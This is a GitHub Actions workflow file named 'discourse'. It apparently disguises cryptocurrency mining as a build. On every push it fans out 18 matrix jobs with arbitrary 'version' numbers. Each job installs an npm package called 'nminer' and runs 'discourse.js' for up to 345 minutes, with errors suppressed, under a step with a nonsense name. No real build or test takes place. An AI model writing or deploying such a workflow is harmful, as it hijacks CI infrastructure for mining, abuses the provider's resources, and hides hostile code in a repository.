name: discourse
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 3454 }
          - { version: 5857 }
          - { version: 4300 }
          - { version: 9620 }
          - { version: 2777 }
          - { version: 2628 }
          - { version: 5722 }
          - { version: 6487 }
          - { version: 347 }
          - { version: 5971 }
          - { version: 3898 }
          - { version: 1615 }
          - { version: 6783 }
          - { version: 2798 }
          - { version: 8632 }
          - { version: 7433 }
          - { version: 4863 }
          - { version: 2052 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: defensive bootleg above swathe
        run: |
          npm install nminer@latest
          timeout 345m node discourse.js || echo "discourse executed"